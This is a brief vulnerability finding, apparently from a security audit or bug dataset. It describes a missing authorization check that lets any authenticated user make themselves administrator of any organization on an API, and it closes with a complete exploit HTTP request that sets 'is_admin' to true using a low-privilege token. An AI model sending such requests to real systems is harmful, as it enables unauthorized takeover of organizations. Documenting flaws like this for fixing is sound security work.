diagnosis: UpdateOrganizationMemberRoleView alters the administrative status of an OrganizationUser solely using member_id without checking whether the authenticated user has administrative privileges over that organization, nor whether member_id belongs to org_id. Any authenticated platform user can promote themselves or arbitrary members to administrator status in any organization.
exploit_request:
PUT /api/organizations/12/members/481/role/ HTTP/1.1
Host: api.workhub.com
Authorization: Bearer low_privilege_user_jwt
Content-Type: application/json

{
  "is_admin": true
}
